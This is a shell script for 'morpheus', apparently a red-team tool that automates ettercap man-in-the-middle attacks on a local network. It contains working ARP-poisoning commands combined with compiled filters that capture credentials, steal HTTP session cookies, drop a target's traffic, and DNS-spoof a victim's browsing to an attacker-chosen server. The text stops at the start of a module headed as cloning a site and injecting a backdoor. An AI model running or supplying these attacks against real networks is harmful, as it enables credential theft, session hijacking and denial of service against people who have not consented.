#!/bin/sh
###
# morpheus - automated ettercap TCP/IP Hijacking tool
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.7
# Suspicious-Shell-Activity (SSA) RedTeam develop @2016
# codename: blue_dreams [ GPL licensed ]
###

###
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 32 85 > /dev/null
# inicio




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



Colors;
echo ""
cat << !
    ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
    ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
    ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
!
# ---------------------
# check if user is root
# ---------------------
if [ $(id -u) != "0" ]; then
echo ${RedF}[☠]${white} we need to be root to run this script...${Reset};
echo ${RedF}[☠]${white} execute [ sudo ./morpheus.sh ] on terminal ${Reset};
exit
else
echo "root user" > /dev/null 2>&1
fi


apc=`which ettercap`
if [ "$?" -eq "0" ]; then
echo "ettercap found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[☠]${white} ettercap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires ettercap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
echo ""
exit
fi



npm=`which nmap`
if [ "$?" -eq "0" ]; then
echo "nmap found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[☠]${white} nmap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires nmap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install nmap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
echo ""
exit
fi


# ------------------------------------------
# pass arguments to script [ -h ]
# we can use: ./morpheus.sh -h for help menu
# ------------------------------------------
while getopts ":h" opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2016
-- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
-- Suspicious-Shell-Activity (SSA) RedTeam develop @2016
---

   morpheus.sh framework automates tcp/udp packet manipulation tasks by using
   ettercap filters to manipulate target http requests under MitM attacks
   replacing the http packet contents by our own contents befor sending the
   packet back to the host that have request for it (tcp/ip hijacking).

   morpheus ships with a collection of etter filters writen be me to acomplish
   various tasks: replacing images in webpages, replace text in webpages, inject
   payloads using html <form> tag, denial-of-service attack (drop packets from source)
   https/ssh downgrade attacks, redirect target browser traffic to another ip address
   and also gives you the ability to build/compile your filter from scratch and lunch
   it through morpheus framework.

!
   exit
    ;;
    \?)
      echo ${RedF}[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
      exit
    ;;
  esac
done




# ---------------------
# Variable declarations
# ---------------------
dtr=`date | awk '{print $4}'`        # grab current hour
V3R="1.7"                            # module version number
cnm="Antidote"                       # module codename
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd`                          # grab morpheus.sh install path
GaTe=`ip route | grep "default" | awk {'print $3'}`     # gateway
IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`  # ip-range
PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2` > /dev/null 2>&1
Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2` > /dev/null 2>&1
Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2` > /dev/null 2>&1
ApachE=`cat $IPATH/settings | egrep -m 1 "AP_PATH" | cut -d '=' -f2` > /dev/null 2>&1 # apache2 webroot





# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 270`;;
esac


# config internal framework settings
ping -c 4 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Config internal framework settings...\nip addr, ip range, gateway, interface\netter.conf, etter.dns, uid/gid privileges." --percentage=0 --auto-close --width 290 > /dev/null 2>&1
if [ -e $Econ ]; then
  cp $Econ /tmp/etter.conf > /dev/null 2>&1
  cp $IPATH/bin/etter.conf $Econ > /dev/null 2>&1
  sleep 1
else
  echo ${RedF}[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
  echo ${RedF}[x]${white} edit settings File to input path of etter.conf File ${Reset};
  sleep 2
  exit
fi


# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "${RedF}[x]${white} CTRL+C abort tasks${RedF}...${Reset}"
# clean logfiles folder at exit
rm $IPATH/logs/lan.mop > /dev/null 2>&1
rm $IPATH/output/firewall.ef > /dev/null 2>&1
rm $IPATH/output/template.ef > /dev/null 2>&1
rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
rm $IPATH/output/img_replace.ef > /dev/null 2>&1
# revert filters to default stage
mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
# revert ettercap conf files to default stage
if [ -e $Edns ]; then
mv /tmp/etter.dns $Edns > /dev/null 2>&1
fi
if [ -e $Econ ]; then
mv /tmp/etter.conf $Econ > /dev/null 2>&1
fi
sleep 2
exit
}



#
#
# START OF SCRIPT FUNTIONS
#
#
# ----------------------------------------
# PRE-CONFIGURATED TEMPLATE - FIREWALL.EFT
# ----------------------------------------
sh_stage1 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}This module acts like a firewall report/block/capture_credentials ${BlueF}|"
echo "${BlueF}    | ${YellowF}    from the selected targets tcp/udp connections (local lan)     ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};
  sleep 1
fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270) > /dev/null 2>&1


  cd $IPATH/filters
  ed=`hostname`
  echo "$ed"7 > /tmp/test
  hOstNaMe=`cat /tmp/test`
  dIsd=`uname -r`
  # replace values in template.filter with sed bash command
  sed -i "s|TaRONE|$fil_one|g" firewall.eft # NO dev/null to report file not existence :D
  sed -i "s|TaRTWO|$fil_two|g" firewall.eft > /dev/null 2>&1
  sed -i "s|hOst|$hOstNaMe|g" firewall.eft > /dev/null 2>&1
  sed -i "s|MoDeM|$GaTe|g" firewall.eft > /dev/null 2>&1
  sed -i "s|DisTr|$dIsd|g" firewall.eft > /dev/null 2>&1
  rm /tmp/test /dev/null 2>&1
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/firewall.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# -------------------------------------------
# SIDEJACKING ATTACK (HTTP) STEAL COOKIE
# -------------------------------------------
sh_stage2 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module will display port 80(tcp) and port 443(https)     ${BlueF}|"
echo "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  If any auth cookie its captured And stored 'sidejacking.log'    ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit sidejacking.eft '(filter)'${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling sidejacking.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/sidejacking.eft -o $IPATH/output/sidejacking.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# -------------------------------------------
# DROP/KILL TCP/UDP CONNECTION TO/FROM TARGET
# -------------------------------------------
sh_stage3 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   This module will drop/kill any tcp/udp connections attempted   ${BlueF}|"
echo "${BlueF}    | ${YellowF}   to/from target, droping packets from source and destination..  ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit packet_drop.eft '(filter)'${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" packet_drop.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/packet_drop.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling packet_drop.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# -----------------------------------------
# REDIRECT TARGET TRAFIC TO ANOTHER IP ADDR
# -----------------------------------------
sh_stage4 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   This module will ask user to input an ip address to redirect   ${BlueF}|"
echo "${BlueF}    | ${YellowF}    all browser surfing in target to the selected ip address.     ${BlueF}|"
echo "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the spoof ip addr'   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: $IP\nWARNING: next value must be decimal..." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$fil_one|g" etter.dns # NO dev/null to report file not existence :D
  sed -i "s|TaRgEt|$fil_one|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  # using SED bash command to config redirect.eft
  sed -i "s|IpAdR|$fil_one|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
  cd $IPATH
  sleep 1

# compiling redirect.eft to be used in ettercap
xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
sleep 1
xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  rm $IPATH/output/redirect.ef > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# -----------------------------------------------
# REDIRECT TARGET TRAFIC TO GOOGLE SPHERE (prank)
# -----------------------------------------------
sh_stage5 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}      This module will redirect target browsing surfing under     ${BlueF}|"
echo "${BlueF}    | ${YellowF}       mitm attacks to google sphere website (google prank)       ${BlueF}|"
echo "${BlueF}    | ${YellowF}      'All [.com] domains will be redirected to mrdoob.com'       ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  # using SED bash command to config redirect.eft
  sed -i "s|IpAdR|http://mrdoob.com/projects/chromeexperiments/google-sphere/|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
  # copy files needed to apache2 webroot...
  cp -R $IPATH/bin/phishing/"Google Sphere_files" $ApachE > /dev/null 2>&1
  cp $IPATH/bin/phishing/index.html $ApachE > /dev/null 2>&1
  cd $IPATH
  sleep 1

# compiling packet_drop.eft to be used in ettercap
xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
sleep 1
xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  rm $IPATH/output/redirect.ef > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
  rm -R $ApachE/"Google Sphere_files"
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------------------------------
# CLONE WEBSITE AND INJECT BACKDOOR ON </BODY><IFRAME> TAG
# --------------------------------------------------------
sh_stage6 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
